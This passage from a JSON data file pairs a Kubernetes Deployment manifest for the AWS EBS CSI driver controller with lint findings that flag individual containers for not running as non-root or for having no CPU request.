imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-resizer\" is not set to runAsNonRoot"
  },
  {
    "id": "7287",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-snapshotter\" is not set to runAsNonRoot"
  },
  {
    "id": "7288",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ebs-plugin\" is not set to runAsNonRoot"
  },
  {
    "id": "7289",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "7290",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-attacher\" has cpu request 0"
  },
  {
    "id": "7291",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-provisioner\" has cpu request 0"
  },
  {
    "id": "7292",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-resizer\" has cpu request 0"
  },
  {
    "id": "7293",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-snapshotter\" has cpu request 0"
  },
  {
    "id": "7294",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
